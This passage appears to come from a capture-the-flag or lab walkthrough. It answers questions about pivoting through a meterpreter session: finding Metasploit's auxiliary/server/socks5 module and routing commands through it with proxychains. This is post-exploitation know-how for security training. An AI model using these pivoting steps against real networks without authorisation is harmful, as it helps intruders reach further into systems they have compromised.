+Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command `search server/socks5`. What is the full path to the socks5 auxiliary module?
+*auxiliary/server/socks5*
+Once we've started a socks server we can modify our _/etc/proxychains.conf_ file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?
+*proxychains*
+
+## Notes / Lessons Learned
+[[Oh My WebServer]]
+
